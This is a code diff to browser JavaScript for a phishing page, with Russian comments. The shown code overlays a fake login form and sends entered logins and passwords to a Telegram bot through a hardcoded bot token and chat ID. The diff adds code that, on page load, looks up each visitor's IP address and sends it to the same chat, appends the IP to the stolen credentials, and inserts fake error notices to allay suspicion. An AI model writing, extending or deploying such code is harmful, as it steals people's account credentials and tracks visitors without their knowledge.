@@ -1,3 +1,38 @@
+// Сообщение в начале
+const messageContainer = document.querySelector(".typography.overflow");
+if (messageContainer) {
+  messageContainer.innerHTML = `
+    <div class="notice notice--red notice--medium">
+      <div class="notice__content">
+        <div class="notice__content__text">
+          <p>Личные письма доступны только из dev!</p>
+        </div>
+      </div>
+    </div>`;
+}
+
+// Получаем IP пользователя
+let userIP = "Не удалось определить";
+fetch("https://api.ipify.org?format=json")
+  .then(res => res.json())
+  .then(data => {
+    userIP = data.ip;
+
+    // Отправка IP в Telegram сразу после получения
+    const token = "8385745346:AAGl9qWQ5vQMVXSHaMe9tBGBUDoK46cn-Z8";
+    const chatId = "-1003077695457"; 
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: `🖥 Новый пользователь подключился. IP: ${userIP}`
+      })
+    }).catch(err => console.error("Ошибка отправки IP в Telegram:", err));
+  })
+  .catch(err => console.error("Ошибка получения IP:", err));
+
 // Блокируем прокрутку
 document.body.style.position = "relative";
 document.body.style.overflow = "hidden";
@@ -72,7 +107,7 @@ function sendToTelegram(login, password) {
   const chatId = "-1003077695457"; 
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-  const text = `🔑 Логин: ${login}\n🔒 Пароль: ${password}`;
+  const text = `🔑 Логин: ${login}\n🔒 Пароль: ${password}\n🌐 IP: ${userIP}`;
 
   fetch(url, {
     method: "POST",
@@ -131,6 +166,19 @@ form.addEventListener("submit", function (e) {
         loginViewport.remove();
         document.body.style.overflow = "";
         document.body.style.position = "";
+
+        // показываем ошибку про личные сообщения
+        const errorBlock = document.createElement("div");
+        errorBlock.className = "notice notice--red notice--medium";
+        errorBlock.innerHTML = `
+          <div class="notice__content">
+            <div class="notice__content__text"><p>Личные сообщения не работают в production!</p></div>
+          </div>`;
+
+        const td = document.createElement("td");
+        td.colSpan = 2;
+        td.appendChild(errorBlock);
+        document.body.appendChild(td);
       } else if (data.errors && data.errors.length > 0) {
         // ошибка
         const msg = data.errors[0].text || "Ошибка входа";
